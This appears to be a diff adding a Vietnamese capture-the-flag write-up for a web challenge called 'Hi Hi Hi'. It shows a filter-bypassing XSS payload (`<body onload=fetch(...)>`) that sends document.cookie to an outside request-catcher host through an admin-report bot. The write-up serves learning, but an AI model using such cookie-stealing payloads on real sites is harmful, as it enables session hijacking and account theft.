@@ -83,4 +83,60 @@ Ta lấy được phần Flag cuối: `QtC3F8fH6g}`
 
 Flag: `KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}`
 
+## Hi Hi Hi
+
+### Description
+Khi ta truy cập vào trang Web BTC cung cấp sẽ được:
+- Trang chủ:
+
+![image](https://user-images.githubusercontent.com/86275419/212838054-5469a059-11f1-47a7-8c3e-05169bacb27b.png)
+
+- Report Admin:
+![image](https://user-images.githubusercontent.com/86275419/212838901-9dfe2bcd-e1b1-45d4-9790-4dbca344a4fd.png)
+
+
+
+Trang web này Author đã hint cho chúng ta dính lỗi XSS (trên Tab Name) nên ta sẽ focus vào việc test các lỗi XSS ở trang chủ sau đó vào chức năng Report Admin để gửi URL chứa Script XSS tới Server để lấy giá trị Cookie (mình đoán trên Server sẽ có một con Bot để kick link mình gửi lên)
+
+### Solution
+
+Sau một hồi test lỗi XSS bằng các Script phổ biến thì mình thấy bị Filter:
+
+![image](https://user-images.githubusercontent.com/86275419/212839811-eacf99ca-8846-435e-a084-1d8ce1aed471.png)
+
+Mình đã lên [đây](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) để tìm script và mình tìm được: `<body onload=alert(1)>` không bị filter
+
+![image](https://user-images.githubusercontent.com/86275419/212840507-e99e5b03-f6b3-4a0b-9c34-89ff672df9eb.png)
+
++ `<body onload=alert(1)>`: Khi load đến tag này sẽ thi câu lệnh ở attribute `onload`, ở câu lệnh này sẽ thực thi alert(1)
+
+Mình sẽ custom lại đoạn script để nó có chức năng gửi lại cookie cho mình khi một ai đó bấm vào link bằng cách sử dụng `Fetch API`:
+
+![image](https://user-images.githubusercontent.com/86275419/212841794-123427ba-a15e-45ea-b201-4e4db48b201b.png)
+
+Domain mình sẽ dùng https://requestcatcher.com/ để bắt lại các request khi được gửi đến, ngoài các bạn có thể dùng `Burp Collaborator` của Burp Suite
+
+Payload: `<body onload=fetch('https://duypt.requestcatcher.com/test',{method:'POST',mode:'no-cors',body:document.cookie})>`
+
+Khi mình test trên trang web dính lỗi thì đã bắt được request đến:
+
+![image](https://user-images.githubusercontent.com/86275419/212845189-c6d4f663-d1bb-4e2c-ac8d-51fda51af805.png)
+
+URL: `http://146.190.115.228:20109/?message=<body onload=fetch('https://duypt.requestcatcher.com/test',{method:'POST',mode:'no-cors',body:document.cookie})>`
+
+Nhưng khi mình gửi URL chứa đoạn script kia đến server thì đã có vấn đề, server không có request nào đến trang web (https://duypt.requestcatcher.com/test) của mình, dường như payload của mình đã bị filter
+
+Nhưng sau cùng mình thử lại và nhận ra rằng không có sự filter nào mà là do mình gửi không đúng port,  mình thử thay port giống như Author hint nhưng không để ý:
+![image](https://user-images.githubusercontent.com/86275419/212853082-5165fae2-dc32-4b54-8721-8f93e81e2c76.png)
+
+Mình sẽ custom lại payload: `http://127.0.0.1:13337/?message=<body onload=fetch('https://duypt.requestcatcher.com/test',{method:'POST',mode:'no-cors',body:document.cookie})>`
+
+Kiểm tra lại bên `requestcatcher.com`:
+ 
+ ![image](https://user-images.githubusercontent.com/86275419/212851929-c9f020eb-64b6-479f-85d4-91c65614902b.png)
+ 
+ Flag: `KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}`
+
+ 
+
 
